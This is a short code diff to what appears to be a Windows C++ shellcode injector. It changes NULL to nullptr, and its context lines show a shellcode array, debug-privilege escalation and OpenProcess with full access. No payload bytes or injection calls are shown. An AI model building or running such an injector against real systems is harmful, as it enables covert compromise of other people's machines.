@@ -50,7 +50,7 @@ unsigned char shellcode[580] = {
 
 int main() {
     DWORD dwProcessID = 0;
-    HANDLE hProcess = NULL;
+    HANDLE hProcess = nullptr;
     if (!enablePrivilege()) {
         cout << "EnablePrivilege error" << endl;
         return -1;
@@ -62,7 +62,7 @@ int main() {
     }
 
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
-    if (hProcess == NULL) {
+    if (hProcess == nullptr) {
         cout << "openprocess error" << endl;
         return -1;
     }
@@ -113,7 +113,7 @@ BOOL enablePrivilege()
         return FALSE;
     }
 
-    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &token_priv.Privileges[0].Luid)) {
+    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &token_priv.Privileges[0].Luid)) {
         FreeLibrary(hNtdll);
         cout << GetLastError() << endl;
         return FALSE;
